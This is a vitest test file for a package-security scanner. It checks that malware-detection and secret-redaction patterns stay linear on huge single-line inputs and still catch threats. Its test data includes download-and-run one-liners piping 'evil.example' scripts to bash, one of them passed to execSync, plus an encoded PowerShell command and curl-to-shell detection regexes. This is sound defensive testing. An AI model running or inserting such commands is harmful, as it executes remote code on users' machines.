import { describe, expect, it } from "vitest";
import { deterministicFindings, type FileRecord } from "../server/lib/review";
import { redactFileRecords, redactText } from "../server/lib/review/redaction";
import {
  firstMatchingCodeLine,
  firstMatchingLine,
  firstMatchingSourceLine,
  matchesAnyPattern,
} from "../server/lib/platform/text-utils";

/**
 * Cost guard for the deterministic scanner.
 *
 * Package bodies are unbounded evidence and a minified bundle is a single
 * multi-megabyte line, so a pattern that is superlinear in the length of the
 * string it is handed is a CPU-exhaustion primitive against the parent Worker —
 * reachable anonymously through /diff by publishing a package. Two real ones
 * shipped (the `curl … | sh` download-execute pair, and the PEM private-key
 * redaction pattern). `platform/text-utils.ts` bounds deterministic matchers to
 * sliding windows, while the full-body redaction patterns stay linear.
 *
 * These budgets are deliberately loose — they are catching "quadratic", not
 * "slow" — so they stay stable on a loaded CI box.
 */

// Shapes that expose greedy/lazy rescanning, each as ONE line (the minified
// bundle case). If any pattern is superlinear in line length, the 512 KB
// variant blows the budget by orders of magnitude.
const PAYLOADS: Array<[string, (bytes: number) => string]> = [
  ["pipes-after-curl", (n) => "curl " + "|".repeat(n)],
  ["pipes-after-wget", (n) => "wget " + "|".repeat(n)],
  ["pipes-after-iwr", (n) => "iwr " + "|".repeat(n)],
  ["curl-then-slashes", (n) => "curl x |" + "/".repeat(n)],
  ["curl-then-words", (n) => "curl x |" + "env ".repeat(n / 4)],
  ["nc-dashes", (n) => "nc " + " -".repeat(n / 2)],
  ["powershell-dashes", (n) => "powershell " + " -".repeat(n / 2)],
  ["unclosed-block-comments", (n) => "/*a".repeat(n / 3) + "*/"],
  ["open-block-comments", (n) => "/*".repeat(n / 2)],
  ["begin-private-key", (n) => "-----BEGIN PRIVATE KEY-----".repeat(n / 27)],
  ["begin-rsa-key", (n) => "-----BEGIN RSA PRIVATE KEY-----".repeat(n / 31)],
  ["secret-assignments", (n) => "secret=".repeat(n / 14) + "a".repeat(n / 2)],
  ["scheme-credentials", (n) => "http://user:".repeat(n / 12)],
  ["bearer-headers", (n) => "authorization=Bearer ".repeat(n / 21)],
  ["env-access", (n) => "process.env.CI".repeat(n / 14)],
  ["gyp-node-command", (n) => "<!(" + "node ".repeat(n / 5)],
  ["obfuscated-table", (n) => "_0xdeadbeef".repeat(n / 11)],
];

const SMALL_BYTES = 32 * 1024;
const LARGE_BYTES = 512 * 1024;
// 16x the input for at most this much more time. A quadratic pattern needs
// ~256x; a linear one needs ~16x.
const MAX_GROWTH_FACTOR = 48;
// Floor so that sub-millisecond timings cannot manufacture a huge ratio.
const NOISE_FLOOR_MS = 15;

function scanFile(body: string): void {
  const files: FileRecord[] = [
    file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
    file("index.js", body),
  ];
  deterministicFindings(
    files,
    [],
    { name: "probe", version: "1.0.0" },
    {
      entrypointResolution: "npm",
    },
  );
  redactFileRecords(files);
}

function file(path: string, textSample: string): FileRecord {
  return { path, size: textSample.length, sha256: "0".repeat(64), textSample, flags: [] };
}

function elapsedMs(run: () => void): number {
  const started = performance.now();
  run();
  return performance.now() - started;
}

describe("deterministic scan cost", () => {
  it("matches directly across a bounded scan-window seam", () => {
    const source = `${"a".repeat(8 * 1024 - 4)}needle`;
    const pattern = /needle/g;
    expect(matchesAnyPattern(source, [pattern])).toBe(true);
    expect(matchesAnyPattern(source, [pattern])).toBe(true);
    expect(matchesAnyPattern(source, [/absent/])).toBe(false);
  });

  it("does not manufacture regex boundaries at scan-window seams", () => {
    // The bounded matcher uses a 6 KB core with 1 KB of context on each side.
    // Put `fetch` at the second core boundary, where slicing without context
    // would turn the suffix of `prefetch` into a standalone network call.
    const source = `${"x".repeat(6 * 1024 - 3)}prefetch(${"z".repeat(3 * 1024)}`;
    expect(matchesAnyPattern(source, [/\bfetch\s*\(/])).toBe(false);
    expect(matchesAnyPattern(source, [/(?<![\w$.])fetch\s*\(/])).toBe(false);

    const anchored = `${"x".repeat(6 * 1024)}import os${"z".repeat(3 * 1024)}`;
    expect(matchesAnyPattern(anchored, [/^import\s+/])).toBe(false);

    const artificialEnd = `needle${"a".repeat(7 * 1024 - 6)}!${"z".repeat(3 * 1024)}`;
    expect(matchesAnyPattern(artificialEnd, [/needle[^!]*$/])).toBe(false);
  });

  it.each(PAYLOADS)(
    "stays linear in line length: %s",
    (_name, make) => {
      const small = Math.max(
        elapsedMs(() => scanFile(make(SMALL_BYTES))),
        NOISE_FLOOR_MS,
      );
      const large = elapsedMs(() => scanFile(make(LARGE_BYTES)));
      expect(large / small).toBeLessThan(MAX_GROWTH_FACTOR);
    },
    120000,
  );

  it("scans a large hostile line in bounded time", () => {
    // Absolute budget, not a ratio: the Worker CPU limit is what this protects.
    for (const [, make] of PAYLOADS) {
      expect(elapsedMs(() => scanFile(make(LARGE_BYTES)))).toBeLessThan(5000);
    }
  }, 240000);

  it("still finds a download-execute one-liner", () => {
    const findings = deterministicFindings(
      [
        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
        file(
          "install.js",
          "const cp = require('child_process');\ncp.execSync('curl -fsSL https://evil.example/x.sh | sudo -E /bin/bash');\n",
        ),
      ],
      [],
      { name: "probe", version: "1.0.0" },
      { entrypointResolution: "npm" },
    );
    expect(findings.length).toBeGreaterThan(0);
  });

  it.each([
    `curl -H "X-Pad: ${"a".repeat(512)}" https://evil.example/x.sh | bash`,
    `curl -H "X-Pad: ${"a".repeat(9 * 1024)}" https://evil.example/x.sh | bash`,
    `powershell ${"-NoProfile ".repeat(48)} -EncodedCommand QUFBQQ==`,
  ])("does not let padding hide a download-execute command", (command) => {
    const findings = deterministicFindings(
      [
        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
        file("install.js", command),
      ],
      [],
      { name: "probe", version: "1.0.0" },
      { entrypointResolution: "npm" },
    );
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ ruleId: "code.remote-shell", severity: "critical" }),
      ]),
    );
  });

  it("does not compose shell signals across statement barriers", () => {
    const command = `curl -H "X-Pad: ${"a".repeat(9 * 1024)}" https://example.invalid/x; echo ok | bash`;
    const findings = deterministicFindings(
      [
        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
        file("install.js", command),
      ],
      [],
      { name: "probe", version: "1.0.0" },
      { entrypointResolution: "npm" },
    );
    expect(findings.some((finding) => finding.ruleId === "code.remote-shell")).toBe(false);
  });

  it("still finds a base64 decode whose prefix is in an earlier scan window", () => {
    const source = `const code = Buffer.from("${"A".repeat(9 * 1024)}", "base64");`;
    const findings = deterministicFindings(
      [
        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
        file("payload.js", source),
      ],
      [],
      { name: "probe", version: "1.0.0" },
      { entrypointResolution: "npm" },
    );
    expect(findings).toEqual(
      expect.arrayContaining([expect.objectContaining({ ruleId: "code.dynamic-evaluation" })]),
    );
  });

  it("still redacts a PEM private key", () => {
    const pem = [
      "-----BEGIN RSA PRIVATE KEY-----",
      "Proc-Type: 4,ENCRYPTED",
      "DEK-Info: AES-256-CBC,0123456789ABCDEF",
      "",
      "MIIEowIBAAKCAQEA3Tz2mr7SZiAMfQyuvBjM9Oi",
      "-----END RSA PRIVATE KEY-----",
    ].join("\n");
    expect(redactText(`key = ${pem}`)).toContain("[REDACTED_PRIVATE_KEY]");
    expect(redactText(`key = ${pem}`)).not.toContain("MIIEowIBAAKCAQEA");
  });

  it("redacts an armored private key larger than 20 KB", () => {
    const body = "A".repeat(24 * 1024);
    const pem =
      `-----BEGIN PGP PRIVATE KEY-----\nComment: generated ---- offline\n\n${body}\n` +
      "-----END PGP PRIVATE KEY-----";
    const redacted = redactText(`key = ${pem}`);
    expect(redacted).toContain("[REDACTED_PRIVATE_KEY]");
    expect(redacted).not.toContain(body);

    const findings = deterministicFindings(
      [
        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
        file("key.pem", pem),
      ],
      [],
      { name: "probe", version: "1.0.0" },
      { entrypointResolution: "npm" },
    );
    expect(findings).toEqual(
      expect.arrayContaining([expect.objectContaining({ ruleId: "file.secret-content" })]),
    );
  });

  it("does not treat a private-key delimiter constant as key material", () => {
    const source = 'export const PRIVATE_KEY_HEADER = "-----BEGIN PRIVATE KEY-----";';
    const findings = deterministicFindings(
      [
        file("package.json", JSON.stringify({ name: "probe", version: "1.0.0" })),
        file("pem-parser.js", source),
      ],
      [],
      { name: "probe", version: "1.0.0" },
      { entrypointResolution: "npm" },
    );
    expect(findings.some((finding) => finding.ruleId === "file.secret-content")).toBe(false);
  });

  it("finds a match that straddles a scan-window seam", () => {
    // Put the match at the start of the second 6 KB core. Its 1 KB left context
    // must preserve the real word boundary while the first window rejects the
    // same match because it starts outside that window's core.
    const filler = `${"a".repeat(6 * 1024 - 1)} `;
    const line = `${filler}curl https://x | bash`;
    expect(firstMatchingLine(line, [/\bcurl\b[^\n;&]{0,400}\|\s*(?:ba)?sh\b/])).toBe(1);
    expect(firstMatchingCodeLine(line, [/\bcurl\b[^\n;&]{0,400}\|\s*(?:ba)?sh\b/])).toBe(1);
    expect(firstMatchingSourceLine(`x\n${line}`, [/\bcurl\b[^\n;&]{0,400}\|\s*(?:ba)?sh\b/])).toBe(
      2,
    );
  });
});
